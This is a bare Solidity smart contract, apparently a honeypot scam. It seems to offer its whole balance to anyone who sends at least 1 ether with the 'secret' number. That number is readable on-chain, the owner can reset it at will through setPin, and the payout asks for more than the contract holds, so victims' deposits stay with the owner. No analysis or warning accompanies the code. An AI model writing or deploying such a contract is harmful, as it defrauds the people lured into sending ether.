pragma solidity ^0.5.2;

contract PinRequired {
    address payable public owner;
    uint private topSecretNumber = 376001928;

    constructor() payable public {
        owner = msg.sender;
    }

	function setPin(uint pin) public {
		require(msg.sender == owner);
		topSecretNumber = pin;
	}

    function withdraw() payable public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
    
    function withdraw(uint256 amount) payable public {
        require(msg.sender == owner);
        owner.transfer(amount);
    }

    function kill() public {
        require(msg.sender == owner);
        selfdestruct(msg.sender);
    }

    function guess(uint g) public payable {
        if(msg.value >= address(this).balance && g == topSecretNumber && msg.value >= 1 ether) {
            msg.sender.transfer(address(this).balance + msg.value);
        }
    }
    
	function() external payable {}
}